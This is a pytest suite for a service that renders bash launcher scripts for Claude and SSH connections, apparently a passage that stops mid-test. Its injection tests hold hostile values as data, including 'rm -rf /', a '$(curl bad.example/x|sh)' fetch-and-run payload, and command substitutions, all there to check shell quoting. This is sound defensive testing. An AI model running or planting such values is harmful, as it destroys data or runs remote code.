# -*- coding: utf-8 -*-
"""
Tests for cpsm.services.template_service.

Test categories
---------------
1. Snapshot tests — one per built-in profile + _placeholder, comparing
   rendered output to golden files under tests/services/snapshots/.
   First run writes the golden; subsequent runs assert equality.

2. Security (injection) tests — malicious values for project_folder,
   claude_options, host, env values, etc.  Asserts the rendered output
   round-trips through shlex.split / shlex.quote such that the malicious
   chars are treated as data, not as shell metacharacters.

3. Override directory tests — custom template file in a tmp dir overrides
   the built-in; restore_default() removes it.

4. list_builtin / render_placeholder API surface tests.

5. Error-path tests — unknown profile, missing custom_template_id, etc.

6. bash -n syntax-check tests — each rendered output (and raw template) must
   pass `bash -n`.
"""

from __future__ import annotations

import os
import re
import shlex
import shutil
import subprocess
import tempfile
import textwrap
import types
from pathlib import Path

import pytest

from cpsm.services.template_service import (
    IdentityKeyNotFoundError,
    TemplateMustacheError,
    TemplateNotFoundError,
    TemplateService,
    _ssh_option_values,
)

# ---------------------------------------------------------------------------
# Helpers / fixtures
# ---------------------------------------------------------------------------

SNAPSHOTS_DIR = Path(__file__).parent / "snapshots"


def _make_remote_conn(
    *,
    conn_id: str = "my-remote",
    host: str = "example.com",
    user: str = "deploy",
    sudo_user: str = "appuser",
    project_folder: str = "/opt/myproject",
    claude_options: str = "--resume",
    identity_file: str = "/home/deploy/.ssh/id_ed25519",
    port: int = 22,
) -> types.SimpleNamespace:
    return types.SimpleNamespace(
        id=conn_id,
        launch_profile="claude-remote",
        host=host,
        port=port,
        user=user,
        sudo_user=sudo_user,
        project_folder=project_folder,
        claude_options=claude_options,
        identity_file=identity_file,
        env={},
        name="My Remote",
        notes=None,
        jump_host=None,
    )


def _make_local_conn(
    *,
    conn_id: str = "my-local",
    project_folder: str = "/home/user/project",
    claude_options: str = "--resume",
    sudo_user: str = "",
) -> types.SimpleNamespace:
    return types.SimpleNamespace(
        id=conn_id,
        launch_profile="claude-local",
        project_folder=project_folder,
        claude_options=claude_options,
        sudo_user=sudo_user or None,
        env={},
        name="My Local",
        notes=None,
    )


def _make_ssh_shell_conn(
    *,
    conn_id: str = "my-ssh-shell",
    host: str = "bastion.example.com",
    user: str = "ops",
    identity_file: str = "/home/ops/.ssh/id_ed25519",
    project_folder: str = "/var/www",
) -> types.SimpleNamespace:
    return types.SimpleNamespace(
        id=conn_id,
        launch_profile="ssh-shell",
        host=host,
        user=user,
        identity_file=identity_file,
        project_folder=project_folder,
        sudo_user=None,
        env={},
        name="My SSH Shell",
        notes=None,
        jump_host=None,
        port=22,
    )


def _make_local_shell_conn(
    *,
    conn_id: str = "my-local-shell",
    project_folder: str = "/home/user/workspace",
) -> types.SimpleNamespace:
    return types.SimpleNamespace(
        id=conn_id,
        launch_profile="local-shell",
        project_folder=project_folder,
        sudo_user=None,
        env={},
        name="My Local Shell",
        notes=None,
    )


def _make_settings(
    ssh_options: str = "-o ConnectTimeout=10 -o ServerAliveInterval=30",
) -> types.SimpleNamespace:
    return types.SimpleNamespace(default_ssh_options=ssh_options)


# ---------------------------------------------------------------------------
# 1. Snapshot tests
# ---------------------------------------------------------------------------


def _snapshot_path(profile: str) -> Path:
    """Return the golden snapshot file path for *profile*."""
    return SNAPSHOTS_DIR / f"{profile}.sh"


def _assert_snapshot(profile: str, rendered: str) -> None:
    """Write golden on first run; assert equality on subsequent runs.

    Set ``CPSM_UPDATE_SNAPSHOTS=1`` to rewrite the goldens instead of
    asserting.  Regenerating is a deliberate act: the diff is the review
    surface for a template change, so read it before committing.

    That variable was named in this function's failure message for a long time
    without anything reading it — the only way to regenerate was to delete the
    golden file, which the message did not say. It is now real.
    """
    snap = _snapshot_path(profile)
    if os.environ.get("CPSM_UPDATE_SNAPSHOTS") == "1" or not snap.exists():
        snap.parent.mkdir(parents=True, exist_ok=True)
        snap.write_text(rendered, encoding="utf-8")
        return
    golden = snap.read_text(encoding="utf-8")
    assert rendered == golden, (
        f"Snapshot mismatch for profile={profile!r}.\n"
        f"Re-run with CPSM_UPDATE_SNAPSHOTS=1 to regenerate (then READ THE "
        f"DIFF), or fix the service."
    )


class TestSnapshots:
    """One snapshot per profile, pinning rendered output."""

    def test_snapshot_claude_remote(self) -> None:
        svc = TemplateService()
        conn = _make_remote_conn()
        settings = _make_settings()
        rendered = svc.render("claude-remote", conn, settings=settings)
        _assert_snapshot("claude-remote", rendered)

    def test_snapshot_claude_local(self) -> None:
        svc = TemplateService()
        conn = _make_local_conn()
        rendered = svc.render("claude-local", conn)
        _assert_snapshot("claude-local", rendered)

    def test_snapshot_ssh_shell(self) -> None:
        svc = TemplateService()
        conn = _make_ssh_shell_conn()
        settings = _make_settings()
        rendered = svc.render("ssh-shell", conn, settings=settings)
        _assert_snapshot("ssh-shell", rendered)

    def test_snapshot_local_shell(self) -> None:
        svc = TemplateService()
        conn = _make_local_shell_conn()
        rendered = svc.render("local-shell", conn)
        _assert_snapshot("local-shell", rendered)

    def test_snapshot_placeholder(self) -> None:
        svc = TemplateService()
        rendered = svc.render_placeholder()
        _assert_snapshot("_placeholder", rendered)


class TestReconnectLoopReachable:
    """The [r/s/q] loop is unreachable if _connect() uses exec.

    Regression guard for the bug Karen flagged in Phase 4: claude-local.sh and
    claude-remote.sh used `exec` for the inner claude/ssh invocation, which
    replaces the shell process and prevents control returning to the outer
    while-loop.
    """

    @pytest.mark.parametrize("profile", ["claude-local", "claude-remote"])
    def test_no_exec_in_inner_invocation(self, profile: str) -> None:
        svc = TemplateService()
        if profile == "claude-local":
            conn = _make_local_conn()
            rendered = svc.render(profile, conn)
        else:
            conn = _make_remote_conn()
            settings = _make_settings()
            rendered = svc.render(profile, conn, settings=settings)

        # No bare `exec claude` or `exec sudo` — the loop must be able to resume.
        forbidden_patterns = [
            r"\bexec\s+claude\b",
            r"\bexec\s+sudo\b",
            r"\bexec\s+ssh\b",
        ]
        for pattern in forbidden_patterns:
            assert not re.search(pattern, rendered), (
                f"{profile}: rendered template contains '{pattern}', which would "
                "make the [r/s/q] reconnect loop unreachable. Use a plain call, "
                "not exec, for the inner invocation."
            )


# ---------------------------------------------------------------------------
# 2. Security / injection tests
# ---------------------------------------------------------------------------


MALICIOUS_VALUES = [
    # (description, field_overrides)
    (
        "project_folder with semicolon-rm",
        {"project_folder": "'; rm -rf /"},
    ),
    (
        "claude_options with command substitution",
        {"claude_options": "$(curl bad.example/x|sh)"},
    ),
    (
        "host with subshell injection",
        {"host": "a$(id)b"},
    ),
    (
        "sudo_user with backtick injection",
        {"sudo_user": "`whoami`"},
    ),
    (
        "identity_file with spaces and dollar",
        {"identity_file": "/home/user/my key $HOME/.ssh/evil"},
    ),
    (
        "project_folder with backslash and newline",
        {"project_folder": "/tmp/foo\nrm -rf /"},
    ),
    (
        "claude_options with double-dash and angle brackets",
        {"claude_options": "--resume > /etc/passwd"},
    ),
]


def _field_is_shell_safe(quoted_value: str, original: str) -> bool:
    """Return True when shlex.split(quoted_value) == [original].

    This verifies that the value was shell-quoted such that a POSIX shell
    would treat the entire string as a single token with value == original.
    """
    try:
        tokens = shlex.split(quoted_value)
    except ValueError:
        return False
    return tokens == [original]


@pytest.mark.parametrize("description,overrides", MALICIOUS_VALUES)
class TestRenderedQuoting:
    """Verify injection attempts are neutralised by shlex.quote in the rendered text.

    These tests assert that shlex.quote(value) appears in the rendered output,
    confirming variable-assignment lines are safe for a single shell layer.
    They do NOT execute the rendered scripts — see TestActualInjection for that.
    """

    def test_claude_remote_injection(self, description: str, overrides: dict[str, str]) -> None:
        """Each overridden field in claude-remote must be quoted as a single shell token."""
        svc = TemplateService()

        kwargs: dict[str, str] = {}
        # Apply overrides to the matching constructor parameter
        for field, value in overrides.items():
            kwargs[field] = value

        conn = _make_remote_conn(**kwargs)  # type: ignore[arg-type]
        settings = _make_settings()
        rendered = svc.render("claude-remote", conn, settings=settings)

        for field, original_value in overrides.items():
            quoted = shlex.quote(original_value)
            assert quoted in rendered, (
                f"[{description}] Expected shlex.quote({original_value!r}) == {quoted!r} "
                f"to appear in rendered output, but it didn't.\nRendered:\n{rendered}"
            )

    def test_claude_local_injection(self, description: str, overrides: dict[str, str]) -> None:
        """Each overridden field in claude-local must be quoted as a single shell token."""
        svc = TemplateService()

        local_fields = {"project_folder", "claude_options", "sudo_user"}
        relevant = {k: v for k, v in overrides.items() if k in local_fields}
        if not relevant:
            pytest.skip("No applicable fields for claude-local")

        conn = _make_local_conn(**relevant)  # type: ignore[arg-type]
        rendered = svc.render("claude-local", conn)

        for field, original_value in relevant.items():
            quoted = shlex.quote(original_value)
            assert quoted in rendered, (
                f"[{description}] Expected {quoted!r} in claude-local rendered output.\n"
                f"Rendered:\n{rendered}"
            )

    def test_ssh_shell_injection(self, description: str, overrides: dict[str, str]) -> None:
        """Each overridden field in ssh-shell must be quoted as a single shell token."""
        svc = TemplateService()

        ssh_fields = {"host", "identity_file", "project_folder"}
        relevant = {k: v for k, v in overrides.items() if k in ssh_fields}
        if not relevant:
            pytest.skip("No applicable fields for ssh-shell")

        conn = _make_ssh_shell_conn(**relevant)  # type: ignore[arg-type]
        settings = _make_settings()
        rendered = svc.render("ssh-shell", conn, settings=settings)

        for field, original_value in relevant.items():
            quoted = shlex.quote(original_value)
            assert quoted in rendered, (
                f"[{description}] Expected {quoted!r} in ssh-shell rendered output.\n"
                f"Rendered:\n{rendered}"
            )

    def test_local_shell_injection(self, description: str, overrides: dict[str, str]) -> None:
        """project_folder injection in local-shell must be quoted."""
        svc = TemplateService()

        local_fields = {"project_folder"}
        relevant = {k: v for k, v in overrides.items() if k in local_fields}
        if not relevant:
            pytest.skip("No applicable fields for local-shell")

        conn = _make_local_shell_conn(**relevant)  # type: ignore[arg-type]
        rendered = svc.render("local-shell", conn)

        for field, original_value in relevant.items():
            quoted = shlex.quote(original_value)
            assert quoted in rendered, (
                f"[{description}] Expected {quoted!r} in local-shell rendered output.\n"
                f"Rendered:\n{rendered}"
            )


class TestRemoteControl:
    """Renderer prepends ``--remote-control <name>`` to claude_options when
    the connection has ``remote_control_enabled=True``.

    Name resolution: explicit remote_control_name → connection.name →
    connection.id.
    """

    @staticmethod
    def _co_line(rendered: str) -> str:
        lines = [line for line in rendered.splitlines() if line.startswith("_CLAUDE_OPTIONS=")]
        assert lines, f"no _CLAUDE_OPTIONS line in:\n{rendered}"
        return lines[0]

    def test_disabled_leaves_claude_options_untouched(self) -> None:
        svc = TemplateService()
        conn = _make_remote_conn(claude_options="--resume")
        # No remote_control_* attributes at all → renderer uses getattr default
        out = svc.render("claude-remote", conn)
        assert "--remote-control" not in out

    def test_enabled_with_explicit_name(self) -> None:
        svc = TemplateService()
        conn = _make_remote_conn(claude_options="--resume")
        conn.remote_control_enabled = True  # type: ignore[attr-defined]
        conn.remote_control_name = "web-server-1"  # type: ignore[attr-defined]
        out = svc.render("claude-remote", conn)
        co = self._co_line(out)
        assert "--remote-control" in co
        assert "web-server-1" in co
        assert "--resume" in co

    def test_enabled_with_no_name_falls_back_to_connection_name(self) -> None:
        svc = TemplateService()
        conn = _make_remote_conn(claude_options="--resume")
        conn.remote_control_enabled = True  # type: ignore[attr-defined]
        conn.remote_control_name = None  # type: ignore[attr-defined]
        conn.name = "backend-prod"  # type: ignore[attr-defined]
        out = svc.render("claude-remote", conn)
        co = self._co_line(out)
        assert "backend-prod" in co

    def test_enabled_with_no_name_and_no_connection_name_uses_id(self) -> None:
        svc = TemplateService()
        conn = _make_remote_conn(conn_id="fallback-id", claude_options="")
        conn.remote_control_enabled = True  # type: ignore[attr-defined]
        conn.remote_control_name = None  # type: ignore[attr-defined]
        conn.name = None  # type: ignore[attr-defined]
        out = svc.render("claude-remote", conn)
        co = self._co_line(out)
        assert "fallback-id" in co

    def test_enabled_on_claude_local(self) -> None:
        svc = TemplateService()
        conn = _make_local_conn(claude_options="--continue")
        conn.remote_control_enabled = True  # type: ignore[attr-defined]
        conn.remote_control_name = "dev.local"  # type: ignore[attr-defined]
        out = svc.render("claude-local", conn)
        co = self._co_line(out)
        assert "--remote-control" in co
        assert "dev.local" in co
        assert "--continue" in co

    def test_empty_claude_options_still_gets_flag(self) -> None:
        svc = TemplateService()
        conn = _make_remote_conn(claude_options="")
        conn.remote_control_enabled = True  # type: ignore[attr-defined]
        conn.remote_control_name = "x"  # type: ignore[attr-defined]
        out = svc.render("claude-remote", conn)
        co = self._co_line(out)
        # Should still contain the flag even with no other options
        assert "--remote-control" in co and " x" in co


class TestEnvInjection:
    """Env-level injection via connection.env dict."""

    def test_env_key_injection(self) -> None:
        conn = _make_local_conn()
        conn.env = {"MY_VAR": "$(evil command)"}  # type: ignore[attr-defined]
        # Env vars are surfaced via {{env.MY_VAR}} in custom templates;
        # the context stores them as "env.MY_VAR" keys.
        # Inject into a custom template to verify quoting.
        svc = TemplateService()

        custom_tpl = types.SimpleNamespace(
            id="my-tpl",
            bash="#!/bin/bash\ncd {{env.MY_VAR}}\nexec bash",
        )
        conn2 = types.SimpleNamespace(
            id="custom-conn",
            launch_profile="custom",
            custom_template_id="my-tpl",
            env={"MY_VAR": "$(evil command)"},
            project_folder="",
            sudo_user=None,
            name=None,
            notes=None,
        )
        rendered = svc.render("custom", conn2, templates=[custom_tpl])
        assert shlex.quote("$(evil command)") in rendered


# ---------------------------------------------------------------------------
# 3. Override directory tests
# ---------------------------------------------------------------------------


class TestOverrideDirectory:
    """Custom templates in override_dir take precedence over built-ins."""

    def test_override_used_when_present(self, tmp_path: Path) -> None:
        custom_content = "#!/bin/bash\n# custom override\necho hello\n"
        override_file = tmp_path / "claude-remote.sh"
        override_file.write_text(custom_content, encoding="utf-8")

        svc = TemplateService(override_dir=tmp_path)
        conn = _make_remote_conn()
        # The custom template has no {{...}} placeholders, so render returns it as-is.
        rendered = svc.render("claude-remote", conn)
        assert rendered == custom_content

    def test_builtin_used_when_no_override(self, tmp_path: Path) -> None:
        svc = TemplateService(override_dir=tmp_path)
        conn = _make_local_shell_conn()
        rendered = svc.render("local-shell", conn)
        # Should use built-in, which contains the cd placeholder template
        assert "project_folder" in rendered or shlex.quote("/home/user/workspace") in rendered

    def test_restore_default_removes_override(self, tmp_path: Path) -> None:
        override_file = tmp_path / "claude-remote.sh"
        override_file.write_text("#!/bin/bash\n# override\n", encoding="utf-8")
        assert override_file.exists()

        svc = TemplateService(override_dir=tmp_path)
        svc.restore_default("claude-remote")

        assert not override_file.exists()

    def test_restore_default_noop_when_no_override(self, tmp_path: Path) -> None:
        svc = TemplateService(override_dir=tmp_path)
        # Should not raise
        svc.restore_default("claude-remote")

    def test_restore_default_noop_without_override_dir(self) -> None:
        svc = TemplateService()  # no override_dir
        svc.restore_default("claude-remote")  # should not raise

    def test_restore_default_unknown_profile_raises(self) -> None:
        svc = TemplateService()
        with pytest.raises(TemplateNotFoundError):
            svc.restore_default("nonexistent-profile")


# ---------------------------------------------------------------------------
# 4. API surface tests
# ---------------------------------------------------------------------------


class TestApiSurface:
    def test_list_builtin_returns_all_profiles(self) -> None:
        svc = TemplateService()
        profiles = svc.list_builtin()
        assert set(profiles) == {"claude-remote", "claude-local", "ssh-shell", "local-shell"}

    def test_render_placeholder_matches_spec(self) -> None:
        svc = TemplateService()
        rendered = svc.render_placeholder()
        assert "empty slot" in rendered
        assert "sleep infinity" in rendered
        assert "\\033[2;37m" in rendered

    def test_render_unknown_profile_raises(self) -> None:
        svc = TemplateService()
        conn = _make_local_shell_conn()
        with pytest.raises(TemplateNotFoundError):
            svc.render("nonexistent", conn)

    def test_render_custom_no_templates_raises(self) -> None:
        svc = TemplateService()
        conn = types.SimpleNamespace(
            id="c1",
            launch_profile="custom",
            custom_template_id="my-tpl",
            env={},
        )
        with pytest.raises(TemplateNotFoundError):
            svc.render("custom", conn)

    def test_render_custom_missing_template_id_raises(self) -> None:
        svc = TemplateService()
        conn = types.SimpleNamespace(
            id="c1",
            launch_profile="custom",
            custom_template_id=None,
            env={},
        )
        with pytest.raises(TemplateNotFoundError):
            svc.render("custom", conn, templates=[])

    def test_render_custom_template_not_found_raises(self) -> None:
        svc = TemplateService()
        conn = types.SimpleNamespace(
            id="c1",
            launch_profile="custom",
            custom_template_id="missing-tpl",
            env={},
        )
        with pytest.raises(TemplateNotFoundError):
            svc.render("custom", conn, templates=[])

    def test_settings_ssh_options_injected(self) -> None:
        svc = TemplateService()
        conn = _make_remote_conn()
        settings = _make_settings(ssh_options="-o StrictHostKeyChecking=yes")
        rendered = svc.render("claude-remote", conn, settings=settings)
        assert shlex.quote("-o StrictHostKeyChecking=yes") in rendered

    def test_no_settings_uses_empty_ssh_options(self) -> None:
        svc = TemplateService()
        conn = _make_remote_conn()
        rendered = svc.render("claude-remote", conn, settings=None)
        # Should not raise; ssh_options will be ''
        assert rendered  # non-empty

    def test_render_custom_success(self) -> None:
        svc = TemplateService()
        tpl = types.SimpleNamespace(id="my-tpl", bash="#!/bin/bash\ncd {{project_folder}}\n")
        conn = types.SimpleNamespace(
            id="c1",
            launch_profile="custom",
            custom_template_id="my-tpl",
            env={},
            project_folder="/some/path",
            sudo_user=None,
            name=None,
            notes=None,
            host=None,
            user=None,
            identity_file=None,
            claude_options=None,
            port=22,
            jump_host=None,
        )
        rendered = svc.render("custom", conn, templates=[tpl])
        assert shlex.quote("/some/path") in rendered


# ---------------------------------------------------------------------------
# 5. Mustache renderer edge cases
# ---------------------------------------------------------------------------


class TestMustacheRenderer:
    def test_env_fallback(self) -> None:
        """{{env.MISSING_VAR|fallback}} returns 'fallback' when var absent."""
        import os

        svc = TemplateService()
        tpl = types.SimpleNamespace(
            id="t", bash="#!/bin/bash\necho {{env.CPSM_TEST_MISSING_99|fallback_val}}\n"
        )
        conn = types.SimpleNamespace(
            id="c",
            launch_profile="custom",
            custom_template_id="t",
            env={},
            project_folder="",
            sudo_user=None,
            name=None,
            notes=None,
            host=None,
            user=None,
            identity_file=None,
            claude_options=None,
            port=22,
            jump_host=None,
        )
        # Ensure the env var is NOT set
        os.environ.pop("CPSM_TEST_MISSING_99", None)
        rendered = svc.render("custom", conn, templates=[tpl])
        assert shlex.quote("fallback_val") in rendered

    def test_env_from_connection(self) -> None:
        """connection.env values override os.environ for {{env.KEY}}."""
        svc = TemplateService()
        tpl = types.SimpleNamespace(id="t", bash="#!/bin/bash\necho {{env.MY_KEY}}\n")
        conn = types.SimpleNamespace(
            id="c",
            launch_profile="custom",
            custom_template_id="t",
            env={"MY_KEY": "my_value"},
            project_folder="",
            sudo_user=None,
            name=None,
            notes=None,
            host=None,
            user=None,
            identity_file=None,
            claude_options=None,
            port=22,
            jump_host=None,
        )
        rendered = svc.render("custom", conn, templates=[tpl])
        assert shlex.quote("my_value") in rendered

    def test_missing_field_no_default_raises(self) -> None:
        """{{totally_unknown}} with no default raises TemplateMustacheError."""
        svc = TemplateService()
        tpl = types.SimpleNamespace(id="t", bash="#!/bin/bash\necho {{totally_unknown}}\n")
        conn = types.SimpleNamespace(
            id="c",
            launch_profile="custom",
            custom_template_id="t",
            env={},
            project_folder="",
            sudo_user=None,
            name=None,
            notes=None,
            host=None,
            user=None,
            identity_file=None,
            claude_options=None,
            port=22,
            jump_host=None,
        )
        with pytest.raises(TemplateMustacheError):
            svc.render("custom", conn, templates=[tpl])

    def test_field_with_default_fallback(self) -> None:
        """{{notes|no-notes}} uses 'no-notes' when notes is None."""
        svc = TemplateService()
        tpl = types.SimpleNamespace(id="t", bash="#!/bin/bash\n# {{notes|no-notes}}\n")
        conn = types.SimpleNamespace(
            id="c",
            launch_profile="custom",
            custom_template_id="t",
            env={},
            project_folder="",
            sudo_user=None,
            name=None,
            notes=None,
            host=None,
            user=None,
            identity_file=None,
            claude_options=None,
            port=22,
            jump_host=None,
        )
        rendered = svc.render("custom", conn, templates=[tpl])
        assert shlex.quote("no-notes") in rendered

    def test_env_key_resolves_from_os_environ_when_context_missing(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """{{env.KEY}} falls back to os.environ when connection.env doesn't
        provide it (line 100 of template_service.py — the `return env_value`
        branch, distinct from the existing test_env_from_connection and
        test_env_fallback cases which cover context and default paths).
        """
        monkeypatch.setenv("CPSM_TEST_ONLY_IN_OSENVIRON", "os_environ_value")
        svc = TemplateService()
        tpl = types.SimpleNamespace(
            id="t", bash="#!/bin/bash\necho {{env.CPSM_TEST_ONLY_IN_OSENVIRON}}\n"
        )
        conn = types.SimpleNamespace(
            id="c",
            launch_profile="custom",
            custom_template_id="t",
            env={},  # deliberately empty — force fall-through to os.environ
            project_folder="",
            sudo_user=None,
            name=None,
            notes=None,
            host=None,
            user=None,
            identity_file=None,
            claude_options=None,
            port=22,
            jump_host=None,
        )
        rendered = svc.render("custom", conn, templates=[tpl])
        assert shlex.quote("os_environ_value") in rendered

    def test_env_key_missing_no_default_raises_mustache_error(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """{{env.MISSING}} with no default and no env value raises
        TemplateMustacheError (line 103 — the "no default, not set" branch).
        Distinct from test_env_fallback, which supplies a default.
        """
        monkeypatch.delenv("CPSM_TEST_NEVER_SET_KEY", raising=False)
        svc = TemplateService()
        tpl = types.SimpleNamespace(
            id="t", bash="#!/bin/bash\necho {{env.CPSM_TEST_NEVER_SET_KEY}}\n"
        )
        conn = types.SimpleNamespace(
            id="c",
            launch_profile="custom",
            custom_template_id="t",
            env={},
            project_folder="",
            sudo_user=None,
            name=None,
            notes=None,
            host=None,
            user=None,
            identity_file=None,
            claude_options=None,
            port=22,
            jump_host=None,
        )
        with pytest.raises(TemplateMustacheError) as exc_info:
            svc.render("custom", conn, templates=[tpl])
        assert "CPSM_TEST_NEVER_SET_KEY" in str(exc_info.value)

    def test_custom_template_id_matches_later_entry_in_templates_list(self) -> None:
        """Loop-iteration coverage for template_service.py:278-279 — when
        the requested template_id is not the FIRST entry in the templates
        list, the resolver must skip through and return the matching one.
        """
        svc = TemplateService()
        first = types.SimpleNamespace(id="not-me", bash="wrong template")
        target = types.SimpleNamespace(id="the-one", bash="#!/bin/bash\necho {{project_folder}}\n")
        conn = types.SimpleNamespace(
            id="c",
            launch_profile="custom",
            custom_template_id="the-one",
            env={},
            project_folder="/tmp/x",
            sudo_user=None,
            name=None,
            notes=None,
            host=None,
            user=None,
            identity_file=None,
            claude_options=None,
            port=22,
            jump_host=None,
        )
        rendered = svc.render("custom", conn, templates=[first, target])
        assert shlex.quote("/tmp/x") in rendered
        assert "wrong template" not in rendered

    def test_identity_file_ref_resolves_via_ssh_keys_list(self) -> None:
        """`_build_context` (template_service.py:319-320): when
        connection.identity_file_ref matches an entry in the ssh_keys
        list, the resolver uses that key's private_path — the primary
        modern lookup path.
        """
        svc = TemplateService()
        tpl = types.SimpleNamespace(
            id="t",
            bash="#!/bin/bash\necho identity={{identity_file}}\n",
        )
        conn = types.SimpleNamespace(
            id="c",
            launch_profile="custom",
            custom_template_id="t",
            env={},
            project_folder="",
            sudo_user=None,
            name=None,
            notes=None,
            host="h",
            user="u",
            identity_file_ref="the-key-id",
            identity_file="",  # backward-compat field intentionally empty
            claude_options=None,
            port=22,
            jump_host=None,
        )
        ssh_keys = [
            types.SimpleNamespace(id="unrelated", private_path="/tmp/wrong"),
            types.SimpleNamespace(id="the-key-id", private_path="/home/user/.ssh/id_new"),
        ]
        rendered = svc.render("custom", conn, templates=[tpl], ssh_keys=ssh_keys)
        assert shlex.quote("/home/user/.ssh/id_new") in rendered
        assert "/tmp/wrong" not in rendered

    def test_identity_file_ref_not_in_ssh_keys_falls_back_to_identity_file(
        self,
    ) -> None:
        """`_build_context` (template_service.py:314-324): when
        connection.identity_file_ref is set but the ssh_keys list doesn't
        contain a matching entry, resolution falls through to
        connection.identity_file (the backward-compat field).  Exercises
        both the loop-exhausted branch (317-320) and the fallback
        assignment (321-324).
        """
        svc = TemplateService()
        tpl = types.SimpleNamespace(
            id="t",
            bash="#!/bin/bash\necho identity={{identity_file}}\n",
        )
        conn = types.SimpleNamespace(
            id="c",
            launch_profile="custom",
            custom_template_id="t",
            env={},
            project_folder="",
            sudo_user=None,
            name=None,
            notes=None,
            host="h",
            user="u",
            identity_file_ref="unknown-key-id",  # not in ssh_keys below
            identity_file="/home/user/.ssh/legacy_key",  # backward-compat field
            claude_options=None,
            port=22,
            jump_host=None,
        )
        # ssh_keys list intentionally contains a DIFFERENT key so the
        # `for k in ssh_keys` loop runs at least once, misses, and exhausts.
        ssh_keys = [
            types.SimpleNamespace(id="some-other-key", private_path="/tmp/other"),
        ]
        rendered = svc.render("custom", conn, templates=[tpl], ssh_keys=ssh_keys)
        # The fallback path should have picked up the legacy identity_file,
        # then Path().expanduser() would leave the absolute path unchanged.
        assert shlex.quote("/home/user/.ssh/legacy_key") in rendered
        assert "/tmp/other" not in rendered


class TestDanglingIdentityRef:
    """A connection naming a key that does not exist must REFUSE to launch.

    Silently dropping the identity is the dangerous outcome, not a safe
    default: with no ``-i`` there is nothing for ``IdentitiesOnly=yes`` to pin
    to, so ssh falls back to offering every key the agent holds.  Once that
    exceeds sshd's MaxAuthTries (default 6) the connection is torn down before
    the correct key is offered, and the launcher output blames authentication
    rather than the missing key.

    Observed in the field: a config with 21 connections referencing a key id
    ``imported-default`` that no longer existed.  Every one launched unpinned.
    """

    @staticmethod
    def _conn(**over):
        base = dict(
            id="c",
            launch_profile="custom",
            custom_template_id="t",
            env={},
            project_folder="",
            sudo_user=None,
            name="Prod box",
            notes=None,
            host="192.0.2.44",
            user="root",
            identity_file_ref="imported-default",
            claude_options=None,
            port=22,
            jump_host=None,
        )
        base.update(over)
        return types.SimpleNamespace(**base)

    def test_dangling_ref_with_no_fallback_raises(self) -> None:
        svc = TemplateService()
        tpl = types.SimpleNamespace(id="t", bash="#!/bin/bash\necho identity={{identity_file}}\n")
        conn = self._conn(identity_file=None)
        ssh_keys = [
            types.SimpleNamespace(id="id-ed25519", private_path="/home/user/.ssh/id_ed25519"),
            types.SimpleNamespace(id="system-dash", private_path="/home/user/.ssh/dash"),
        ]
        with pytest.raises(IdentityKeyNotFoundError) as exc:
            svc.render("custom", conn, templates=[tpl], ssh_keys=ssh_keys)
        msg = str(exc.value)
        # The message must name the missing id AND what is available, or the
        # operator is left guessing exactly as they were before.
        assert "imported-default" in msg
        assert "id-ed25519" in msg and "system-dash" in msg

    def test_dangling_ref_does_not_render_an_unpinned_launcher(self) -> None:
        """The regression proper: refusing beats rendering something unpinned."""
        svc = TemplateService()
        tpl = types.SimpleNamespace(
            id="t", bash="#!/bin/bash\nssh {{identity_file}} {{user}}@{{host}}\n"
        )
        conn = self._conn(identity_file=None)
        ssh_keys = [types.SimpleNamespace(id="other", private_path="/tmp/other")]
        with pytest.raises(IdentityKeyNotFoundError):
            svc.render("custom", conn, templates=[tpl], ssh_keys=ssh_keys)

    # The three cases below all reached _build_context with a chosen key and
    # no usable path.  An earlier version of the guard keyed off whether the
    # ID matched, so only the first raised and the other two rendered an
    # unpinned launcher -- the very defect the guard exists to stop.

    def test_empty_ssh_keys_list_raises(self) -> None:
        """Every key deleted: ssh_keys == [] is a real schema-default state."""
        svc = TemplateService()
        tpl = types.SimpleNamespace(id="t", bash="#!/bin/bash\necho identity={{identity_file}}\n")
        conn = self._conn(identity_file=None)
        with pytest.raises(IdentityKeyNotFoundError) as exc:
            svc.render("custom", conn, templates=[tpl], ssh_keys=[])
        assert "imported-default" in str(exc.value)

    def test_none_ssh_keys_raises(self) -> None:
        """Caller passed no key list at all, but the connection names a key."""
        svc = TemplateService()
        tpl = types.SimpleNamespace(id="t", bash="#!/bin/bash\necho identity={{identity_file}}\n")
        conn = self._conn(identity_file=None)
        with pytest.raises(IdentityKeyNotFoundError):
            svc.render("custom", conn, templates=[tpl], ssh_keys=None)

    def test_matching_key_with_empty_private_path_raises(self) -> None:
        """The id resolves, but the entry carries no path -- still no -i."""
        svc = TemplateService()
        tpl = types.SimpleNamespace(id="t", bash="#!/bin/bash\necho identity={{identity_file}}\n")
        conn = self._conn(identity_file_ref="blanked", identity_file=None)
        ssh_keys = [types.SimpleNamespace(id="blanked", private_path="")]
        with pytest.raises(IdentityKeyNotFoundError):
            svc.render("custom", conn, templates=[tpl], ssh_keys=ssh_keys)

    def test_no_ref_at_all_still_renders(self) -> None:
        """A connection that never chose a key must NOT be caught by this.

        Uses the ``{{identity_file|}}`` default form the real launcher
        templates use, since with no key there is legitimately no value.
        """
        svc = TemplateService()
        tpl = types.SimpleNamespace(id="t", bash="#!/bin/bash\necho identity={{identity_file|}}\n")
        conn = self._conn(identity_file_ref=None, identity_file=None)
        rendered = svc.render("custom", conn, templates=[tpl], ssh_keys=[])
        assert "identity=" in rendered

    def test_resolvable_ref_still_renders(self) -> None:
        """Guard against the check firing on healthy configs."""
        svc = TemplateService()
        tpl = types.SimpleNamespace(id="t", bash="#!/bin/bash\necho identity={{identity_file}}\n")
        conn = self._conn(identity_file_ref="utility", identity_file=None)
        ssh_keys = [types.SimpleNamespace(id="utility", private_path="/home/user/.ssh/utility")]
        rendered = svc.render("custom", conn, templates=[tpl], ssh_keys=ssh_keys)
        assert shlex.quote("/home/user/.ssh/utility") in rendered


# ---------------------------------------------------------------------------
# 6. bash -n syntax-check tests on raw templates and rendered output
# ---------------------------------------------------------------------------


def _bash_syntax_check(content: str, label: str) -> None:
    """Run `bash -n` on *content* (via stdin) and assert it exits 0."""
    result = subprocess.run(
        ["bash", "-n", "-"],
        input=content,
        text=True,
        encoding="utf-8",
        capture_output=True,
    )
    assert result.returncode == 0, f"bash -n failed for {label!r}:\n{result.stderr}"


class TestBashSyntax:
    """bash -n must report no syntax errors on every template file and rendered output."""

    def test_raw_placeholder(self) -> None:
        svc = TemplateService()
        _bash_syntax_check(svc.render_placeholder(), "_placeholder.sh")

    @pytest.mark.parametrize(
